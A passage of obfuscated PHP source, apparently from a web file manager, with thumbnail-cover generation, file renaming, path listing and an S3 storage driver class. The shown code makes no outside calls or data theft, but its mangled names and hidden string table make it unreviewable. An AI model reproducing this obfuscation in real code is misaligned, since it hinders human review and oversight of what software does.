!function_exists($ñÏáÜş÷[188]) || $ĞùÍ¶Îî[$ñÏáÜş÷[169]] == $ñÏáÜş÷[189]) { return $this->fileOut($Ñ¹Á¾™ô, !1, $ĞùÍ¶Îî[$ñÏáÜş÷[32]]); } $Ñ¶íÍŸ = kodIO::hashPath($ĞùÍ¶Îî); $µ–Ñ¥Ó = "\143\x6f\166\x65\x72\137{$Ñ¶íÍŸ}\137{$ŞÓ¤ø”£}\56\160\156\x67"; $ÑÌ´Â·« = IO_PATH_SYSTEM_TEMP . $ñÏáÜş÷[190]; $óÀßºÑ = IO::infoFullSimple($ÑÌ´Â·«); $êíÏîğÏ = $óÀßºÑ && is_array($óÀßºÑ) ? $óÀßºÑ[$ñÏáÜş÷[87]] : $ñÏáÜş÷[12]; if (!$êíÏîğÏ) { $êíÏîğÏ = IO::mkdir($ÑÌ´Â·«); } if ($ĞùÍ¶Îî[$ñÏáÜş÷[191]] == $ñÏáÜş÷[192] && isset($ĞùÍ¶Îî[$ñÏáÜş÷[193]]) && $ĞùÍ¶Îî[$ñÏáÜş÷[193]] == kodIO::sourceID($êíÏîğÏ)) { $¸Ò¶÷¹û = $ĞùÍ¶Îî[$ñÏáÜş÷[194]]; if ($ŞÓ¤ø”£ <= 500) { $˜õà = preg_replace($ñÏáÜş÷[195], $ñÏáÜş÷[196], $ĞùÍ¶Îî[$ñÏáÜş÷[32]]); $¸Ò¶÷¹û = IO::fileNameExist($êíÏîğÏ, $˜õà); } return IO::fileOut(KodIO::make($¸Ò¶÷¹û), !1, $ĞùÍ¶Îî[$ñÏáÜş÷[32]]); } $ı€Å›†¸ = IO::fileNameExist($êíÏîğÏ, $µ–Ñ¥Ó); if ($ı€Å›†¸) { return IO::fileOut(KodIO::make($ı€Å›†¸), !1, $ĞùÍ¶Îî[$ñÏáÜş÷[32]]); } if ($ŞÓ¤ø”£ > 1000) { $this->makeImageCover($êíÏîğÏ, $Ñ¹Á¾™ô, $µ–Ñ¥Ó, $ŞÓ¤ø”£); $this->makeImageCover($êíÏîğÏ, $Ñ¹Á¾™ô, "\x63\x6f\x76\145\162\137{$Ñ¶íÍŸ}\x5f\x32\65\60\56\160\x6e\x67", 250); $ı€Å›†¸ = IO::fileNameExist($êíÏîğÏ, $µ–Ñ¥Ó); if ($ı€Å›†¸) { return IO::fileOut(KodIO::make($ı€Å›†¸), !1, $ĞùÍ¶Îî[$ñÏáÜş÷[32]]); } die; } if (!kodIO::allowCover($ĞùÍ¶Îî)) { return $this->fileOut($Ñ¹Á¾™ô, !1, $ĞùÍ¶Îî[$ñÏáÜş÷[32]]); } $şÈéÅ× = Cache::get($µ–Ñ¥Ó); if ($şÈéÅ× == $ñÏáÜş÷[197] || $şÈéÅ× == $ñÏáÜş÷[198]) { echo $şÈéÅ×; die; } Cache::set($µ–Ñ¥Ó, $ñÏáÜş÷[198], 60); $ñ¹Åƒ„¼ = array($êíÏîğÏ, $ĞùÍ¶Îî[$ñÏáÜş÷[87]], $µ–Ñ¥Ó, $ŞÓ¤ø”£); $Œ¦ÖÙ«Ø = $ñÏáÜş÷[199] . $ĞùÍ¶Îî[$ñÏáÜş÷[79]] . $ñÏáÜş÷[200] . $µ–Ñ¥Ó . $ñÏáÜş÷[201] . $ĞùÍ¶Îî[$ñÏáÜş÷[32]] . $ñÏáÜş÷[202] . $ĞùÍ¶Îî[$ñÏáÜş÷[87]]; TaskQueue::add($ñÏáÜş÷[203], $ñ¹Åƒ„¼, $Œ¦ÖÙ«Ø, $µ–Ñ¥Ó); } public function makeImageCover($Ğ™ƒËİœ, $Ã²ıË°, $ÆÇØùŞğ, $´ëºÃş¨) { $á«øğ—ƒ =& $_SERVER[ˆö¿ÚÌ¼]; if (IO::fileNameExist($Ğ™ƒËİœ, $ÆÇØùŞğ)) { return $á«øğ—ƒ[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ÿí£ç‚Û = $this->getPathOuter($Ã²ıË°); $‚ÒøŒ®è = DATA_THUMB . $ÆÇØùŞğ; del_file($‚ÒøŒ®è); $øƒÙ‰òÍ = IO::copy($Ÿí£ç‚Û, TEMP_FILES, !1, $ÆÇØùŞğ); if (!@file_exists($øƒÙ‰òÍ)) { return $á«øğ—ƒ[205]; } ImageThumb::createThumb($øƒÙ‰òÍ, $‚ÒøŒ®è, $´ëºÃş¨, $´ëºÃş¨ * 10); if (@file_exists($‚ÒøŒ®è)) { Cache::remove($ÆÇØùŞğ); return IO::move($‚ÒøŒ®è, $Ğ™ƒËİœ); } Cache::set($ÆÇØùŞğ, $á«øğ—ƒ[197], 600); del_file($‚ÒøŒ®è); return $á«øğ—ƒ[206] . $øƒÙ‰òÍ . $á«øğ—ƒ[74]; } public function fileOutImageServer($ıİÁá³ø, $€¨£ÅÃ = 250) { $this->fileOutImage($ıİÁá³ø, $€¨£ÅÃ); } public function fileNameAuto($¨¥ãù×², $íÏ‹½ô», $£¨Ìâ£ = REPEAT_RENAME, $“ìöîı = false) { $–¦óÓÔ =& $_SERVER[ˆö¿ÚÌ¼]; $Äëş×»Ş = $¨¥ãù×² === $–¦óÓÔ[12] ? $íÏ‹½ô» : rtrim($¨¥ãù×², $–¦óÓÔ[8]) . $–¦óÓÔ[8] . $íÏ‹½ô»; if ($£¨Ìâ£ == REPEAT_REPLACE || !$this->exist($Äëş×»Ş) || $“ìöîı && $£¨Ìâ£ != REPEAT_RENAME_FOLDER) { return $íÏ‹½ô»; } if ($£¨Ìâ£ == REPEAT_SKIP) { return !1; } $†ŞŒ²ñ = $–¦óÓÔ[10] . get_path_ext($íÏ‹½ô»); $†ŞŒ²ñ = $†ŞŒ²ñ == $–¦óÓÔ[10] || $“ìöîı ? $–¦óÓÔ[12] : $†ŞŒ²ñ; $¿¸—Ñ½â = 1; $³ï§Ó¥ = substr($íÏ‹½ô», 0, strlen($íÏ‹½ô») - strlen($†ŞŒ²ñ)); $ÃÁïÊîÅ = $³ï§Ó¥ . "\x28{$¿¸—Ñ½â}\x29{$†ŞŒ²ñ}"; while ($this->exist(rtrim($¨¥ãù×², $–¦óÓÔ[8]) . $–¦óÓÔ[8] . $ÃÁïÊîÅ)) { $ÃÁïÊîÅ = $³ï§Ó¥ . "\x28{$¿¸—Ñ½â}\x29{$†ŞŒ²ñ}"; $¿¸—Ñ½â++; } return $ÃÁïÊîÅ; } private function fileNameAutoList($Ä˜Ê’÷ö, $ÚÇºÄŠ‚, $‹ĞıÊª = false) { $ÌŒ…™í =& $_SERVER[ˆö¿ÚÌ¼]; $‘íĞñ–œ = $this->listPath($Ä˜Ê’÷ö, !0); $‘íĞñ–œ = array_merge($‘íĞñ–œ[$ÌŒ…™í[85]], $‘íĞñ–œ[$ÌŒ…™í[86]]); $éÁÃË’Ú = array_to_keyvalue($‘íĞñ–œ, $ÌŒ…™í[12], $ÌŒ…™í[32]); $ÓÂÖµ· = $ÌŒ…™í[10] . get_path_ext($ÚÇºÄŠ‚); $ÓÂÖµ· = $ÓÂÖµ· == $ÌŒ…™í[10] || $‹ĞıÊª ? $ÌŒ…™í[12] : $ÓÂÖµ·; $ş¬İÛŠ = substr($ÚÇºÄŠ‚, 0, strlen($ÚÇºÄŠ‚) - strlen($ÓÂÖµ·)); $°ã”±ôç = $ş¬İÛŠ . "\x28\x30\x29{$ÓÂÖµ·}"; for ($¿´¾çÎ˜ = 1; $¿´¾çÎ˜ <= count($éÁÃË’Ú) + 1; $¿´¾çÎ˜++) { $°ã”±ôç = $ş¬İÛŠ . "\50{$¿´¾çÎ˜}\x29{$ÓÂÖµ·}"; if (!in_array_not_case($°ã”±ôç, $éÁÃË’Ú)) { return $°ã”±ôç; } } return $°ã”±ôç; } public function listAllFiles($œÀŠÑî, $ËáËšÖå) { $®ªáÅ¡É =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($ËáËšÖå)) { return array(); } $Åà¢Éß = array_keys($ËáËšÖå); $°ÃšÜ½‰ = array(); $œÀŠÑî = trim($œÀŠÑî, $®ªáÅ¡É[8]); foreach ($ËáËšÖå as $—Î„ò£” => $÷´ÊŒ˜µ) { $±ˆë˜›Á = ltrim(substr(trim($—Î„ò£”, $®ªáÅ¡É[8]), strlen($œÀŠÑî)), $®ªáÅ¡É[8]); if (substr($—Î„ò£”, -1) == $®ªáÅ¡É[8]) { $±ˆë˜›Á = rtrim($±ˆë˜›Á, $®ªáÅ¡É[8]) . $®ªáÅ¡É[8]; } $°ÃšÜ½‰ = array_merge($°ÃšÜ½‰, $this->slicePath($±ˆë˜›Á)); } $”ğô§×– = array(); foreach (array_unique($°ÃšÜ½‰) as $ÎÊğÚç) { $‘–”÷Šà = array($®ªáÅ¡É[87] => $this->getPathOuter($®ªáÅ¡É[8] . $œÀŠÑî . $®ªáÅ¡É[8] . $ÎÊğÚç), $®ªáÅ¡É[78] => 1, $®ªáÅ¡É[79] => 0); if (substr($ÎÊğÚç, -1) != $®ªáÅ¡É[8]) { $‘–”÷Šà[$®ªáÅ¡É[78]] = 0; $±†ÌİìÔ = $this->getPath($œÀŠÑî . $®ªáÅ¡É[8] . $ÎÊğÚç); if (isset($ËáËšÖå[$±†ÌİìÔ])) { $„¹Ì¤¬û = $ËáËšÖå[$±†ÌİìÔ]; if (isset($„¹Ì¤¬û[$®ªáÅ¡É[79]])) { $‘–”÷Šà[$®ªáÅ¡É[79]] = intval($„¹Ì¤¬û[$®ªáÅ¡É[79]]); } if (isset($„¹Ì¤¬û[$®ªáÅ¡É[207]])) { $‘–”÷Šà[$®ªáÅ¡É[88]] = intval($„¹Ì¤¬û[$®ªáÅ¡É[207]]); } } } $”ğô§×–[] = $‘–”÷Šà; } return $”ğô§×–; } public function slicePath($˜áâÏœÎ) { $ŠåŠ™Õ =& $_SERVER[ˆö¿ÚÌ¼]; $²ËÌË‚ = explode($ŠåŠ™Õ[8], trim($˜áâÏœÎ, $ŠåŠ™Õ[8])); $ÏÌ¿ÆèÚ = 0; do { ++$ÏÌ¿ÆèÚ; $ó»Àõ¯ƒ[] = implode($ŠåŠ™Õ[8], array_slice($²ËÌË‚, 0, $ÏÌ¿ÆèÚ)) . $ŠåŠ™Õ[8]; } while ($ÏÌ¿ÆèÚ < count($²ËÌË‚)); $ó»Àõ¯ƒ[count($²ËÌË‚) - 1] = $˜áâÏœÎ; return $ó»Àõ¯ƒ; } public function getHost() { $á×ÑÆ­ƒ =& $_SERVER[ˆö¿ÚÌ¼]; $ÚÑ´¹±µ = parse_url(trim($this->domain, $á×ÑÆ­ƒ[8])); $™ÂÍªëĞ = isset($ÚÑ´¹±µ[$á×ÑÆ­ƒ[208]]) ? $ÚÑ´¹±µ[$á×ÑÆ­ƒ[208]] : http_type(); $æ÷í–˜à = isset($ÚÑ´¹±µ[$á×ÑÆ­ƒ[209]]) ? $ÚÑ´¹±µ[$á×ÑÆ­ƒ[209]] : $ÚÑ´¹±µ[$á×ÑÆ­ƒ[87]]; if (isset($ÚÑ´¹±µ[$á×ÑÆ­ƒ[210]])) { $æ÷í–˜à .= $á×ÑÆ­ƒ[4] . $ÚÑ´¹±µ[$á×ÑÆ­ƒ[210]]; } return $™ÂÍªëĞ . $á×ÑÆ­ƒ[211] . $æ÷í–˜à; } public function pathEncode($œø…Ûâ‰) { $±ş«¥×¹ =& $_SERVER[ˆö¿ÚÌ¼]; return str_replace($±ş«¥×¹[212], $±ş«¥×¹[8], rawurlencode($œø…Ûâ‰)); } public function writeLog($ı†À…Æ = '', $æÄ‡¾ò‹ = false) { $Èà¦Ì©Š =& $_SERVER[ˆö¿ÚÌ¼]; $–¯ ‡ğ = in_array(ACTION, array($Èà¦Ì©Š[213], $Èà¦Ì©Š[214])); if (!$–¯ ‡ğ && !GLOBAL_DEBUG) { return; } $ĞÂ±ü¶ù = $ı†À…Æ; static $İÃ±Ğäñ = null; if (!$İÃ±Ğäñ) { $İÃ±Ğäñ = strtoupper($this->getType()); } $ı†À…Æ = $İÃ±Ğäñ . $Èà¦Ì©Š[215] . $ı†À…Æ; if ($æÄ‡¾ò‹) { $À¬òîŞŒ = error_get_last(); if ($À¬òîŞŒ) { $ı†À…Æ = array($ı†À…Æ, $À¬òîŞŒ); } } write_log($ı†À…Æ, $Èà¦Ì©Š[216]); if ($–¯ ‡ğ) { throw new Exception($ĞÂ±ü¶ù); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($‘š”Œµ’) { set_timeout(); require_once SDK_DIR . $_SERVER[ˆö¿ÚÌ¼][217]; parent::__construct(); $this->_init($‘š”Œµ’); } public function _init($¦÷‡“ı) { $’êŒ¢ô‘ =& $_SERVER[ˆö¿ÚÌ¼]; $this->config = $¦÷‡“ı; foreach ($¦÷‡“ı as $Ÿà¾ öã => $Êç½ôÒ€) { if (isset($this->{$Ÿà¾ öã})) { $this->{$Ÿà¾ öã} = $Êç½ôÒ€; } } $this->endpoint = $¦÷‡“ı[$’êŒ¢ô‘[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $­ûèéˆ¨ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($­ûèéˆ¨, 0, 7) == $’êŒ¢ô‘[219]) { $­ûèéˆ¨ = $’êŒ¢ô‘[220] . substr($­ûèéˆ¨, 7); } $this->client->setEndpoint($­ûèéˆ¨); if (in_array(ACTION, array($’êŒ¢ô‘[213], $’êŒ¢ô‘[214]))) { $this->client->setExceptions(); } } public function setSignVersion($–æ”ƒ ê = "\166\x34") { $this->signVer = $–æ”ƒ ê; $this->client->setSignVersion($–æ”ƒ ê); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ûÈŠĞƒ¼) { return null; } } public function isBucketCors() { $Š¦Æòì =& $_SERVER[ˆö¿ÚÌ¼]; $ô¦Åâì = $this->getBucketCors(); if (!$ô¦Åâì || !is_array($ô¦Åâì)) { return !1; } if (!is_array($ô¦Åâì[$Š¦Æòì[221]])) { $ô¦Åâì[$Š¦Æòì[221]] = explode($Š¦Æòì[50], $ô¦Åâì[$Š¦Æòì[221]]); } if ($ô¦Åâì[$Š¦Æòì[222]] != $Š¦Æòì[223] || !in_array($Š¦Æòì[223], $ô¦Åâì[$Š¦Æòì[221]])) { return !1; } $œå ÎŠ… = array_map($Š¦Æòì[224], $ô¦Åâì[$Š¦Æòì[225]]); if (!is_array($œå ÎŠ…)) { $œå ÎŠ… = array(); } $ò™ÃˆƒÎ = array($Š¦Æòì[226], $Š¦Æòì[227], $Š¦Æòì[228], $Š¦Æòì[229], $Š¦Æòì[230]); $˜•Ï¢õĞ = array_diff($ò™ÃˆƒÎ, $œå ÎŠ…); return empty($˜•Ï¢õĞ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($–Êï¸øÜ, $¬˜ÅÎÁ = '', $Æ§¿†¡Õ = REPEAT_RENAME) { $ÉÒ¶áç = $this->setContent($–Êï¸øÜ, $¬˜ÅÎÁ); if ($ÉÒ¶áç !== !1) { return $this->getPathOuter($–Êï¸øÜ); } return !1; } public function mkdir($Ğô¾±ú, $ò·´ı‡ = REPEAT_SKIP) { $Î•Éˆï =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($Ğô¾±ú) && $Ğô¾±ú !== $Î•Éˆï[231]) { return !1; } if ($ò·´ı‡ && $this->_isFolder($Ğô¾±ú)) { return $this->getPathOuter($Ğô¾±ú); } $õæ¬¢…º = $this->setContent($Ğô¾±ú, $Î•Éˆï[12], !0); if ($õæ¬¢…º !== !1) { return $this->getPathOuter($Ğô¾±ú); } return !1; } public function copyFile($¯âŸ¼•, $Ğ±ş×¹, $†ŞÛ»‘­ = array()) { $Ê¡¤“á =& $_SERVER[ˆö¿ÚÌ¼]; $ÃôÎ¿Ä = $this->objectMeta($¯âŸ¼•); if (!$ÃôÎ¿Ä) { return !1; } if ($ÃôÎ¿Ä[$Ê¡¤“á[79]] <= 1024 * 1024 * 200) { $ûªä²˜ë = $this->client->copyObject($this->bucket, $¯âŸ¼•, $this->bucket, $Ğ±ş×¹, $Ê¡¤“á[232], $†ŞÛ»‘­); } else { $ûªä²˜ë = $this->client->multiCopyObject($this->bucket, $¯âŸ¼•, $this->bucket, $Ğ±ş×¹, $†ŞÛ»‘­); } $ûªä²˜ë = $ûªä²˜ë ? $this->getPathOuter($Ğ±ş×¹) : !1; return $ûªä²˜ë; } public function moveFile($Ãæİ£„ê, $Òø¤ÈŸ) { if ($this->copyFile($Ãæİ£„ê, $Òø¤ÈŸ)) { $this->delFile($Ãæİ£„ê); return $this->getPathOuter($Òø¤ÈŸ); } return !1; } public function delFile($™ãî‚Ó) { return $this->client->deleteObject($this->bucket, $™ãî‚Ó); } public function delFolder($Ø˜ıÏœÍ) { $éïıºûœ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->exist($Ø˜ıÏœÍ)) { return !0; } $this->listItemCache = !1; $àÑõ£Ô® = $this->fileList($Ø˜ıÏœÍ); $this->listItemCache = !0; $é­ë±µ® = trim($Ø˜ıÏœÍ, $éïıºûœ[8]) . $éïıºûœ[8]; if (!empty($Ø˜ıÏœÍ) && $Ø˜ıÏœÍ !== $éïıºûœ[231] && !in_array($é­ë±µ®, $àÑõ£Ô®[$éïıºûœ[85]])) { $àÑõ£Ô®[$éïıºûœ[85]][] = $é­ë±µ®; } $«ÄŞ‘„ = $this->delByBatch($àÑõ£Ô®[$éïıºûœ[86]]); if (!$«ÄŞ‘„) { return !1; } $«ÄŞ‘„ = $this->delByBatch($àÑõ£Ô®[$éïıºûœ[85]]); if (!$«ÄŞ‘„) { return !1; } return $this->delFile($é­ë±µ®); } private function delByBatch($¬®£ÏäË) { foreach (array_chunk($¬®£ÏäË, 1000) as $æ¡À×÷“) { $€¡¼Å–¡ = $this->client->deleteObjects($this->bucket, $æ¡À×÷“); if (!$€¡¼Å–¡) { return !1; } } return !0; } public function rename($›¦û’™, $¹ã¢òŒı) { return $this->renameObject($›¦û’™, $¹ã¢òŒı); } public function listPath($Âˆò´ÚÜ, $Ô½æ÷ˆ¡ = false) { $‡”“€®î =& $_SERVER[ˆö¿ÚÌ¼]; $Ä©õİ× = $this->fileList($Âˆò´ÚÜ, $‡”“€®î[8], !0); foreach ($Ä©õİ×[$‡”“€®î[85]] as $äïüÒ => $©¼“İ¥Ù) { $Ä©õİ×[$‡”“€®î[85]][$äïüÒ] = $this->folderInfo($©¼“İ¥Ù, $Ô½æ÷ˆ¡, $©¼“İ¥Ù); } foreach ($Ä©õİ×[$‡”“€®î[86]] as $äïüÒ => $©¼“İ¥Ù) { $Ä©õİ×[$‡”“€®î[86]][$äïüÒ] = $this->fileInfo($©¼“İ¥Ù[$‡”“€®î[32]], $Ô½æ÷ˆ¡, $©¼“İ¥Ù); } return $Ä©õİ×; } protected function infoChildren($êÆŞÚ¿, &$’Ûî®À) { $ƒÏæÃì¾ =& $_SERVER[ˆö¿ÚÌ¼]; $Ù¥ĞÑš = $this->fileList($êÆŞÚ¿, $ƒÏæÃì¾[12], !0); $’Ûî®À[$ƒÏæÃì¾[81]] += count($Ù¥ĞÑš[$ƒÏæÃì¾[85]]); $’Ûî®À[$ƒÏæÃì¾[80]] += count($Ù¥ĞÑš[$ƒÏæÃì¾[86]]); foreach ($Ù¥ĞÑš[$ƒÏæÃì¾[86]] as $‹ù·Ñˆû) { if (!$‹ù·Ñˆû || !$‹ù·Ñˆû[$ƒÏæÃì¾[79]]) { continue; } $’Ûî®À[$ƒÏæÃì¾[79]] += $‹ù·Ñˆû[$ƒÏæÃì¾[79]]; } } private function fileInfo($ŞáÁş„Õ, $«šİ±Í  = false, $¡ş Ã´ª = array()) { $ô‹ú’ú =& $_SERVER[ˆö¿ÚÌ¼]; $Æ¿×Ù = array($ô‹ú’ú[32] => $this->pathThis($ŞáÁş„Õ), $ô‹ú’ú[87] => $this->getPathOuter($ŞáÁş„Õ), $ô‹ú’ú[33] => $ô‹ú’ú[233], $ô‹ú’ú[169] => $this->ext($ŞáÁş„Õ), $ô‹ú’ú[79] => isset($¡ş Ã´ª[$ô‹ú’ú[79]]) ? $¡ş Ã´ª[$ô‹ú’ú[79]] : 0); if ($«šİ±Í ) { return $Æ¿×Ù; } $Æ¿×Ù[$ô‹ú’ú[234]] = $Æ¿×Ù[$ô‹ú’ú[88]] = 0; $Æ¿×Ù[$ô‹ú’ú[235]] = $Æ¿×Ù[$ô‹ú’ú[236]] = !0; if (empty($¡ş Ã´ª)) { $¡ş Ã´ª = $this->objectMeta($ŞáÁş„Õ); if (!$¡ş Ã´ª) { return $Æ¿×Ù; } } if (isset($¡ş Ã´ª[$ô‹ú’ú[237]]) && $¡ş Ã´ª[$ô‹ú’ú[237]]) { $Æ¿×Ù[$ô‹ú’ú[238]] = $¡ş Ã´ª[$ô‹ú’ú[237]]; } if (isset($¡ş Ã´ª[$ô‹ú’ú[207]])) { $Æ¿×Ù[$ô‹ú’ú[88]] = $¡ş Ã´ª[$ô‹ú’ú[207]]; } if (isset($¡ş Ã´ª[$ô‹ú’ú[79]])) { $Æ¿×Ù[$ô‹ú’ú[79]] = $¡ş Ã´ª[$ô‹ú’ú[79]]; } return $Æ¿×Ù; } private function folderInfo($”é±ÔÕá, $ç²ËÅÀå = false, $ İ÷Ã­Æ = array()) { $¯Úû¸ª® =& $_SERVER[ˆö¿ÚÌ¼]; $íªÑ”ƒó = array($¯Úû¸ª®[32] => $this->pathThis($”é±ÔÕá), $¯Úû¸ª®[87] => $this->getPathOuter($¯Úû¸ª®[8] . $”é±ÔÕá), $¯Úû¸ª®[33] => $¯Úû¸ª®[78]); if ($ç²ËÅÀå) { return $íªÑ”ƒó; } $íªÑ”ƒó[$¯Úû¸ª®[234]] = $íªÑ”ƒó[$¯Úû¸ª®[88]] = 0; $íªÑ”ƒó[$¯Úû¸ª®[235]] = $íªÑ”ƒó[$¯Úû¸ª®[236]] = !0; if ($”é±ÔÕá == $¯Úû¸ª®[12]) { return $íªÑ”ƒó; } if (empty($ İ÷Ã­Æ)) { $ İ÷Ã­Æ = $this->objectMeta(trim($”é±ÔÕá, $¯Úû¸ª®[8]) . $¯Úû¸ª®[8]); } if (isset($ İ÷Ã­Æ[$¯Úû¸ª®[207]])) { $íªÑ”ƒó[$¯Úû¸ª®[234]] = $ İ÷Ã­Æ[$¯Úû¸ª®[207]]; } return $íªÑ”ƒó; } private function fileList($šöòà‚, $öÌ•ŠÕ¬ = '', $Ú¶Š = 0) { $ÓÎ‹Ä’¿ =& $_SERVER[ˆö¿ÚÌ¼]; $´”ôåğ = rtrim($šöòà‚, $ÓÎ‹Ä’¿[8]) . $ÓÎ‹Ä’¿[8]; $ïšöùÇ› = $this->listObjs($´”ôåğ, null, null, $öÌ•ŠÕ¬); if (!$ïšöùÇ›) { return array($ÓÎ‹Ä’¿[85] => array(), $ÓÎ‹Ä’¿[86] => array()); } $Ûãşâì¸ = $ù‹¸Ç‘§ = array(); foreach ($ïšöùÇ›[$ÓÎ‹Ä’¿[239]] as $‡ñÀ‘ƒ) { $–æ£Ô‘ = $‡ñÀ‘ƒ[$ÓÎ‹Ä’¿[32]]; if ($–æ£Ô‘ == $´”ôåğ) { continue; } $¸ˆ…ï–Š = isset($‡ñÀ‘ƒ[$ÓÎ‹Ä’¿[79]]) ? $‡ñÀ‘ƒ[$ÓÎ‹Ä’¿[79]] : 0; $–“±¶÷Ô = $¸ˆ…ï–Š == 0 && substr($–æ£Ô‘, strlen($–æ£Ô‘) - 1, 1) == $ÓÎ‹Ä’¿[8] ? !0 : !1; $this->cacheMethodInfoSet($–æ£Ô‘, $–“±¶÷Ô, $‡ñÀ‘ƒ); if ($–“±¶÷Ô) { $Ûãşâì¸[] = $–æ£Ô‘; continue; } $ù‹¸Ç‘§[] = $Ú¶Š ? $‡ñÀ‘ƒ : $–æ£Ô‘; } foreach ($ïšöùÇ›[$ÓÎ‹Ä’¿[240]] as $‡ñÀ‘ƒ) { $Ûãşâì¸[] = $‡ñÀ‘ƒ[$ÓÎ‹Ä’¿[32]]; $this->cacheMethodInfoSet($‡ñÀ‘ƒ[$ÓÎ‹Ä’¿[32]], !0); } $this->cacheMethodInfoSet($šöòà‚, !0); return array($ÓÎ‹Ä’¿[85] => $Ûãşâì¸, $ÓÎ‹Ä’¿[86] => $ù‹¸Ç‘§); } private function listObjs($ğ©ã¹ÉÁ, $½Ö¦ÌÅ = null, $…ëõÆ¾ı = null, $Ïó´Ö¿ = null) { $Ä½—±ß¸ =& $_SERVER[ˆö¿ÚÌ¼]; $ğ©ã¹ÉÁ = trim($ğ©ã¹ÉÁ, $Ä½—±ß¸[8]); $ö³ú³ë· = empty($ğ©ã¹ÉÁ) && $ğ©ã¹ÉÁ !== $Ä½—±ß¸[231] ? $Ä½—±ß¸[12] : $ğ©ã¹ÉÁ . $Ä½—±ß¸[8]; return $this->client->getBucket($this->bucket, $ö³ú³ë·, $½Ö¦ÌÅ, $…ëõÆ¾ı, $Ïó´Ö¿, !0); } public function has($³²¬×å, $ëòÆ·Ñ = false, $•ØšÁ‘ï = true) { $¶î¸€¨¶ =& $_SERVER[ˆö¿ÚÌ¼]; $³²¬×å = trim($³²¬×å, $¶î¸€¨¶[8]); $°Äı¦• = empty($³²¬×å) && $³²¬×å !== $¶î¸€¨¶[231] ? $¶î¸€¨¶[12] : $³²¬×å . $¶î¸€¨¶[8]; $–Ñİ´¹Å = null; $”„é¾˜® = 500; $şôÃãŸŸ = $¶î¸€¨¶[8]; $ê½ıÎæõ = $áÛ”Îáô = array(); while (!0) { $ÓØ›åã¶ = $this->listObjs($³²¬×å, $–Ñİ´¹Å, $”„é¾˜®, $şôÃãŸŸ); if (!$ÓØ›åã¶) { break; } $–Ñİ´¹Å = $ÓØ›åã¶[$¶î¸€¨¶[241]]; $ËçÈÊàÆ = $ÓØ›åã¶[$¶î¸€¨¶[239]]; $îãğÛÑÏ = $ÓØ›åã¶[$¶î¸€¨¶[240]]; if (empty($ËçÈÊàÆ) && empty($îãğÛÑÏ)) { break; } if (count($ËçÈÊàÆ) == 1 && $ËçÈÊàÆ[0][$¶î¸€¨¶[32]] == $°Äı¦•) { break; } if ($ëòÆ·Ñ) { if (count($ËçÈÊàÆ)) { $ËçÈÊàÆ = array_column($ËçÈÊàÆ, $¶î¸€¨¶[32]); $ê½ıÎæõ = array_merge($ê½ıÎæõ, $ËçÈÊàÆ); } if (count($îãğÛÑÏ)) { $îãğÛÑÏ = array_column($îãğÛÑÏ, $¶î¸€¨¶[32]); $áÛ”Îáô = array_merge($áÛ”Îáô, $îãğÛÑÏ); } if ($–Ñİ´¹Å === null) { break; } continue; } if ($•ØšÁ‘ï) { if (!empty($ËçÈÊàÆ)) { if (count($ËçÈÊàÆ) > 1 || isset($ËçÈÊàÆ[0][$¶î¸€¨¶[32]]) && $ËçÈÊàÆ[0][$¶î¸€¨¶[32]] != $°Äı¦•) { return !0; } } } else { if (!empty($îãğÛÑÏ)) { return !0; } } if ($–Ñİ´¹Å === null) { break; } } if ($ëòÆ·Ñ) { $ê½ıÎæõ = array_diff($ê½ıÎæõ, array($°Äı¦•)); $ê½ıÎæõ = count(array_unique($ê½ıÎæõ)); $áÛ”Îáô = count(array_unique($áÛ”Îáô)); return array($¶î¸€¨¶[242] => $ê½ıÎæõ, $¶î¸€¨¶[243] => $áÛ”Îáô); } return !1; } public function listAll($­›Í³Ô—) { $²ê¬ÆÏ³ =& $_SERVER[ˆö¿ÚÌ¼]; $ŞõıÂŸ = $this->fileList($­›Í³Ô—, $²ê¬ÆÏ³[12], !0); $¡«ËçÁ = array_to_keyvalue($ŞõıÂŸ[$²ê¬ÆÏ³[86]], $²ê¬ÆÏ³[32]); foreach ($ŞõıÂŸ[$²ê¬ÆÏ³[85]] as $ß…Ÿä¦®) { if (is_string($ß…Ÿä¦®)) { $¡«ËçÁ[$ß…Ÿä¦®] = array($²ê¬ÆÏ³[79] => 0); } } return $this->listAllFiles($­›Í³Ô—, $¡«ËçÁ); } public function canRead($¾Ÿ˜´ÃÕ) { $µÃ’­ê¯ =& $_SERVER[ˆö¿ÚÌ¼]; $é›€²Å = $this->client->getAccessControlPolicy($this->bucket, $¾Ÿ˜´ÃÕ); if (!$é›€²Å) { return !1; } return in_array($é›€²Å, array($µÃ’­ê¯[244], $µÃ’­ê¯[245], $µÃ’­ê¯[246])) ? !0 : !1; } public function canWrite($ƒ­¿ÚÕş) { $Ö¿‹Ï°é =& $_SERVER[ˆö¿ÚÌ¼]; $ Ê¿¡Ê  = $this->client->getAccessControlPolicy($this->bucket, $ƒ­¿ÚÕş); if (!$ Ê¿¡Ê ) { return !1; } return in_array($ Ê¿¡Ê , array($Ö¿‹Ï°é[244], $Ö¿‹Ï°é[245])) ? !0 : !1; } public function getContent($Õáñ¬Òª) { return $this->client->getObject($this->bucket, $Õáñ¬Òª); } public function setContent($½µ™ÙôÌ, $Ÿû£ê®§ = '', $’“¸Ò¬ = false) { $‘„­Äåâ =& $_SERVER[ˆö¿ÚÌ¼]; $½µ™ÙôÌ = $’“¸Ò¬ ? trim($½µ™ÙôÌ, $‘„­Äåâ[8]) . $‘„­Äåâ[8] : $½µ™ÙôÌ; $ ¤Î˜åÔ = get_file_mime(get_path_ext($½µ™ÙôÌ)); $Èš»›Â¨ = $this->client->putObject($Ÿû£ê®§, $this->bucket, $½µ™ÙôÌ, $‘„­Äåâ[232], array(), $ 